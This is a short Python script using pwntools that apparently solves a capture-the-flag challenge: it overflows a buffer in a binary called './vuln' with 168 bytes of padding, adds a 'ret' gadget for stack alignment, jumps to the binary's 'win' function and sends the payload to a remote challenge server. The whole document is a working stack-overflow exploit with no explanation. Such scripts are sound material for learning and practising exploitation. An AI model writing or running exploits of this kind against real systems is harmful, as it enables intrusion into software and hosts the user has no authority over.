from pwn import *

elf = context.binary = ELF('./vuln')
context.log_level = 'debug'
context.terminal = 'kitty'

offset = 168

rop = ROP(elf)

ret = rop.find_gadget(['ret'])[0]

payload = b'A' * offset + p64(ret) + p64(elf.sym.win)

p = remote('chal1.gryphons.sg', 10001)

p.sendlineafter(': ', payload)

print(p.recvall())
